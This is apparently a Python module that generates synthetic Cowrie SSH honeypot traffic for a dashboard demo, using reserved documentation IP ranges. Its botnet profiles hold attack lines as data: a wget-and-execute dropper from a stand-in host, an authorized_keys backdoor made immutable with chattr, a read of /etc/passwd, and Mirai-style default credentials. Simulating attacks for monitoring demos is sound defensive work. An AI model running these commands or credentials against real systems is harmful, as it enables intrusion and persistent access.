"""
Synthetic Cowrie attack traffic for the local demo (no AWS, no internet).

Produces raw Cowrie-format JSON objects (the same shape cowrie.json contains)
plus an offline "intel" table (geo + reputation) standing in for IPinfo and
AbuseIPDB.

Safety: every attacker address is drawn from IP ranges reserved for
documentation/benchmarking (RFC 5737, RFC 2544), so no real host is ever
labelled as malicious in a presentation.
"""

from __future__ import annotations

import ipaddress
import random
from dataclasses import dataclass
from datetime import datetime, timedelta, timezone
from typing import Any

# Reserved, non-routable ranges: 198.18.0.0/15 (RFC 2544) + the three RFC 5737 TEST-NETs.
_SAFE_NETS = [
    ipaddress.ip_network("198.18.0.0/15"),
    ipaddress.ip_network("192.0.2.0/24"),
    ipaddress.ip_network("198.51.100.0/24"),
    ipaddress.ip_network("203.0.113.0/24"),
]

# Honeypot sensors (match config/deployment-regions.json and the dashboard's REGION_NODES).
SENSORS = {
    "ap-south-1": "ghtm-mumbai-01",
    "us-east-1": "ghtm-virginia-01",
}

# city, country code, country, lat, lon
CITIES: dict[str, tuple[str, str, str, float, float]] = {
    "sao_paulo": ("São Paulo", "BR", "Brazil", -23.55, -46.63),
    "hanoi": ("Hanoi", "VN", "Vietnam", 21.03, 105.85),
    "hcmc": ("Ho Chi Minh City", "VN", "Vietnam", 10.82, 106.63),
    "delhi": ("New Delhi", "IN", "India", 28.61, 77.21),
    "tehran": ("Tehran", "IR", "Iran", 35.69, 51.39),
    "cairo": ("Cairo", "EG", "Egypt", 30.04, 31.24),
    "jakarta": ("Jakarta", "ID", "Indonesia", -6.21, 106.85),
    "beijing": ("Beijing", "CN", "China", 39.90, 116.40),
    "shanghai": ("Shanghai", "CN", "China", 31.23, 121.47),
    "shenzhen": ("Shenzhen", "CN", "China", 22.54, 114.06),
    "singapore": ("Singapore", "SG", "Singapore", 1.35, 103.82),
    "amsterdam": ("Amsterdam", "NL", "Netherlands", 52.37, 4.90),
    "frankfurt": ("Frankfurt", "DE", "Germany", 50.11, 8.68),
    "ashburn": ("Ashburn", "US", "United States", 39.04, -77.49),
    "san_jose": ("San Jose", "US", "United States", 37.34, -121.89),
    "dallas": ("Dallas", "US", "United States", 32.78, -96.80),
    "moscow": ("Moscow", "RU", "Russia", 55.76, 37.62),
    "st_petersburg": ("Saint Petersburg", "RU", "Russia", 59.93, 30.36),
    "kyiv": ("Kyiv", "UA", "Ukraine", 50.45, 30.52),
    "bucharest": ("Bucharest", "RO", "Romania", 44.43, 26.10),
    "hong_kong": ("Hong Kong", "HK", "Hong Kong", 22.32, 114.17),
    "seoul": ("Seoul", "KR", "South Korea", 37.57, 126.98),
    "london": ("London", "GB", "United Kingdom", 51.51, -0.13),
    "paris": ("Paris", "FR", "France", 48.86, 2.35),
    "istanbul": ("Istanbul", "TR", "Turkey", 41.01, 28.98),
    "karachi": ("Karachi", "PK", "Pakistan", 24.86, 67.01),
    "dhaka": ("Dhaka", "BD", "Bangladesh", 23.81, 90.41),
    "lagos": ("Lagos", "NG", "Nigeria", 6.52, 3.38),
    "mexico_city": ("Mexico City", "MX", "Mexico", 19.43, -99.13),
    "buenos_aires": ("Buenos Aires", "AR", "Argentina", -34.60, -58.38),
    "tokyo": ("Tokyo", "JP", "Japan", 35.68, 139.69),
    "sydney": ("Sydney", "AU", "Australia", -33.87, 151.21),
    "johannesburg": ("Johannesburg", "ZA", "South Africa", -26.20, 28.05),
    "toronto": ("Toronto", "CA", "Canada", 43.65, -79.38),
}

NETWORK_TYPES = ["Cloud VPS", "Residential ISP", "Mobile carrier", "Hosting provider", "University network"]

# Documentation-range payload host so commands never reference a real server.
_PAYLOAD_HOST = "203.0.113.50"


@dataclass(frozen=True)
class BotnetProfile:
    name: str
    bots: int
    cities: tuple[str, ...]
    credentials: tuple[tuple[str, str], ...]
    commands: tuple[str, ...]
    success_rate: float  # chance a session ends in a successful login
    sensor_bias: str  # preferred sensor region
    abuse_range: tuple[int, int]
    client_version: str
    sessions_per_bot: tuple[int, int]


BOTNETS: tuple[BotnetProfile, ...] = (
    BotnetProfile(
        name="Mirai-style IoT worm",
        bots=38,
        cities=("sao_paulo", "hanoi", "hcmc", "delhi", "tehran", "cairo", "jakarta", "lagos"),
        credentials=(("root", "xc3511"), ("root", "vizxv"), ("admin", "admin"), ("root", "888888"),
                     ("root", "default"), ("support", "support"), ("root", "juantech")),
        commands=("enable", "system", "shell", "sh", "/bin/busybox MIRAI"),
        success_rate=0.35,
        sensor_bias="ap-south-1",
        abuse_range=(78, 100),
        client_version="SSH-2.0-libssh-0.6.3",
        sessions_per_bot=(1, 3),
    ),
    BotnetProfile(
        name="Cloud SSH brute-forcer",
        bots=26,
        cities=("beijing", "shanghai", "singapore", "amsterdam", "frankfurt", "ashburn", "san_jose"),
        credentials=(("root", "123456"), ("root", "password"), ("root", "admin"), ("ubuntu", "ubuntu"),
                     ("test", "test"), ("oracle", "oracle"), ("postgres", "postgres")),
        commands=("uname -a", "cat /proc/cpuinfo | grep name | wc -l"),
        success_rate=0.15,
        sensor_bias="us-east-1",
        abuse_range=(55, 95),
        client_version="SSH-2.0-Go",
        sessions_per_bot=(2, 5),
    ),
    BotnetProfile(
        name="Cryptominer dropper",
        bots=16,
        cities=("moscow", "st_petersburg", "kyiv", "bucharest"),
        credentials=(("root", "root"), ("admin", "1234"), ("pi", "raspberry"), ("root", "toor"),
                     ("user", "1234")),
        commands=(f"cd /tmp && wget http://{_PAYLOAD_HOST}/x.sh && chmod +x x.sh && ./x.sh",
                  "nproc", "crontab -l", "free -m"),
        success_rate=0.8,
        sensor_bias="us-east-1",
        abuse_range=(85, 100),
        client_version="SSH-2.0-PuTTY_Release_0.70",
        sessions_per_bot=(1, 2),
    ),
    BotnetProfile(
        name="SSH-key backdoor campaign",
        bots=13,
        cities=("hong_kong", "seoul", "shenzhen", "tokyo"),
        credentials=(("root", "qwerty"), ("root", "1qaz2wsx"), ("admin", "password1"), ("root", "abc123"),
                     ("git", "git")),
        commands=("cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2E...demo mdrfckr\" >> .ssh/authorized_keys",
                  "chattr +i ~/.ssh/authorized_keys", "cat /etc/issue"),
        success_rate=0.7,
        sensor_bias="ap-south-1",
        abuse_range=(70, 100),
        client_version="SSH-2.0-libssh2_1.9.0",
        sessions_per_bot=(1, 3),
    ),
    BotnetProfile(
        name="Telecom credential stuffer",
        bots=14,
        cities=("istanbul", "karachi", "dhaka", "mexico_city", "buenos_aires"),
        credentials=(("admin", "admin123"), ("user", "user"), ("guest", "guest"), ("admin", "12345"),
                     ("operator", "operator"), ("support", "123")),
        commands=(),
        success_rate=0.05,
        sensor_bias="ap-south-1",
        abuse_range=(40, 85),
        client_version="SSH-2.0-paramiko_2.7.2",
        sessions_per_bot=(2, 4),
    ),
    BotnetProfile(
        name="Internet-wide recon scanner",
        bots=11,
        cities=("london", "paris", "dallas", "toronto", "frankfurt"),
        credentials=(),
        commands=(),
        success_rate=0.0,
        sensor_bias="us-east-1",
        abuse_range=(10, 45),
        client_version="SSH-2.0-ZGrab ZGrab SSH Survey",
        sessions_per_bot=(1, 2),
    ),
)

_NOISE_USERS = ["root", "admin", "ftp", "mysql", "deploy", "jenkins", "nagios", "www", "ubnt", "tomcat",
                "hadoop", "es", "minecraft", "steam", "vagrant", "ansible", "zabbix", "odoo", "sftp", "dev"]
_NOISE_PASSWORDS = ["letmein", "changeme", "Passw0rd!", "P@ssw0rd", "welcome1", "qwerty123", "111111",
                    "dragon", "monkey", "sunshine", "master", "trustno1", "123qwe", "zaq12wsx", "iloveyou",
                    "server", "linux", "secret", "temp123", "summer2026"]
_NOISE_CMDS = ["ls -la", "whoami", "id", "ps aux", "w", "history", "cat /etc/passwd", "df -h", "ifconfig",
               "uptime", "lscpu", "netstat -an", "cat /etc/os-release", "top -bn1", "last", "env"]
_NOISE_CLIENTS = ["SSH-2.0-OpenSSH_8.9p1", "SSH-2.0-OpenSSH_7.4", "SSH-2.0-PuTTY_Release_0.78",
                  "SSH-2.0-OpenSSH_9.6", "SSH-2.0-AsyncSSH_2.13.0", "SSH-2.0-JSCH-0.1.54",
                  "SSH-2.0-OpenSSH_6.6.1p1", "SSH-2.0-WinSCP_release_5.21", "SSH-2.0-dropbear_2020.81",
                  "SSH-2.0-Renci.SshNet.SshClient.0.0.1", "SSH-2.0-OpenSSH_for_Windows_8.1",
                  "SSH-2.0-russh_0.40", "SSH-2.0-Twisted_22.10.0", "SSH-2.0-HELLOWORLD"]


def _iso(ts: datetime) -> str:
    return ts.astimezone(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%fZ")


class AttackSimulator:
    def __init__(self, seed: int = 1337) -> None:
        self.rng = random.Random(seed)
        self.intel: dict[str, dict[str, Any]] = {}
        self._used_ips: set[str] = set()
        # botnet index -> list of bot IPs
        self.bots: list[list[str]] = []
        for i, profile in enumerate(BOTNETS):
            ips = [self._new_ip(profile.cities, profile.abuse_range, botnet=i) for _ in range(profile.bots)]
            self.bots.append(ips)
        self.noise_ips = [
            self._new_ip(tuple(CITIES), (0, 60), botnet=None) for _ in range(45)
        ]
        # A lone scanner keeps one SSH client implementation.
        self.noise_client = {ip: self.rng.choice(_NOISE_CLIENTS) for ip in self.noise_ips}

    # ------------------------------------------------------------------ intel
    def _new_ip(self, cities: tuple[str, ...], abuse_range: tuple[int, int], botnet: int | None) -> str:
        while True:
            net = self.rng.choice(_SAFE_NETS)
            ip = str(net[self.rng.randrange(1, net.num_addresses - 1)])
            if ip not in self._used_ips and ip != _PAYLOAD_HOST:
                break
        self._used_ips.add(ip)
        city, cc, country, lat, lon = CITIES[self.rng.choice(cities)]
        self.intel[ip] = {
            # Jitter so bots in one city don't render as a single dot.
            "geo_lat": round(lat + self.rng.uniform(-0.6, 0.6), 4),
            "geo_lon": round(lon + self.rng.uniform(-0.6, 0.6), 4),
            "geo_city": city,
            "geo_region": city,
            "geo_country": cc,
            "geo_country_name": country,
            "geo_org": f"AS{self.rng.randint(1000, 64000)} {self.rng.choice(NETWORK_TYPES)} (simulated)",
            "abuse_score": self.rng.randint(*abuse_range),
            "abuse_total_reports": self.rng.randint(0, 900) if botnet is not None else self.rng.randint(0, 40),
        }
        return ip

    # --------------------------------------------------------------- sessions
    def _session(self, *, ip: str, start: datetime, sensor_region: str, creds: list[tuple[str, str]],
                 commands: list[str], success: bool, client_version: str) -> list[dict[str, Any]]:
        rng = self.rng
        session = "%012x" % rng.getrandbits(48)
        sensor = SENSORS[sensor_region]
        t = start
        out: list[dict[str, Any]] = []

        def emit(eventid: str, **fields: Any) -> None:
            nonlocal t
            out.append({
                "eventid": eventid,
                "timestamp": _iso(t),
                "src_ip": ip,
                "src_port": rng.randint(30000, 65000),
                "dst_port": 22,
                "session": session,
                "sensor": sensor,
                "protocol": "ssh",
                "_sensor_region": sensor_region,  # demo-only: which AWS region's bucket it lands in
                **fields,
            })
            t += timedelta(seconds=rng.uniform(0.2, 2.5))

        emit("cowrie.session.connect", dst_ip="10.0.0.12")
        emit("cowrie.client.version", version=client_version)
        for i, (user, pwd) in enumerate(creds):
            last = i == len(creds) - 1
            if last and success:
                emit("cowrie.login.success", username=user, password=pwd)
            else:
                emit("cowrie.login.failed", username=user, password=pwd)
        if success:
            for cmd in commands:
                emit("cowrie.command.input", input=cmd)
            if any("wget" in c for c in commands):
                emit("cowrie.session.file_download", url=f"http://{_PAYLOAD_HOST}/x.sh",
                     shasum="%064x" % rng.getrandbits(256), outfile="var/lib/cowrie/downloads/x.sh")
        emit("cowrie.session.closed", duration=round((t - start).total_seconds(), 2))
        return out

    def _botnet_session(self, idx: int, start: datetime, ip: str | None = None) -> list[dict[str, Any]]:
        profile = BOTNETS[idx]
        ip = ip or self.rng.choice(self.bots[idx])
        # Bots walk the same dictionary in order — that shared list is what clusters them.
        n = len(profile.credentials)
        creds = list(profile.credentials[: self.rng.randint(min(5, n), n)]) if n else []
        success = bool(creds) and self.rng.random() < profile.success_rate
        region = profile.sensor_bias if self.rng.random() < 0.7 else self.rng.choice(list(SENSORS))
        return self._session(ip=ip, start=start, sensor_region=region, creds=creds,
                             commands=list(profile.commands), success=success,
                             client_version=profile.client_version)

    def _noise_session(self, start: datetime, ip: str | None = None) -> list[dict[str, Any]]:
        rng = self.rng
        ip = ip or rng.choice(self.noise_ips)
        creds = [(rng.choice(_NOISE_USERS), rng.choice(_NOISE_PASSWORDS)) for _ in range(rng.randint(1, 4))]
        success = rng.random() < 0.3
        cmds = rng.sample(_NOISE_CMDS, rng.randint(1, 3))
        return self._session(ip=ip, start=start, sensor_region=rng.choice(list(SENSORS)), creds=creds,
                             commands=cmds, success=success, client_version=self.noise_client[ip])

    def random_session(self, start: datetime) -> list[dict[str, Any]]:
        """One attack session — 80% from a botnet, 20% lone scanners."""
        if self.rng.random() < 0.8:
            weights = [p.bots * sum(p.sessions_per_bot) for p in BOTNETS]
            idx = self.rng.choices(range(len(BOTNETS)), weights=weights)[0]
            return self._botnet_session(idx, start)
        return self._noise_session(start)

    def history(self, *, hours: int = 24, now: datetime | None = None) -> list[dict[str, Any]]:
        """Backfill: every bot attacks a few times over the last `hours`, plus lone scanners."""
        now = now or datetime.now(timezone.utc)
        events: list[dict[str, Any]] = []

        def when() -> datetime:
            return now - timedelta(seconds=self.rng.uniform(60, hours * 3600))

        for idx, profile in enumerate(BOTNETS):
            for ip in self.bots[idx]:  # every bot appears at least once
                for _ in range(self.rng.randint(*profile.sessions_per_bot)):
                    events.extend(self._botnet_session(idx, when(), ip=ip))
        for ip in self.noise_ips:
            events.extend(self._noise_session(when(), ip=ip))
        events.sort(key=lambda e: e["timestamp"])
        return events


def botnet_names() -> list[str]:
    return [b.name for b in BOTNETS]
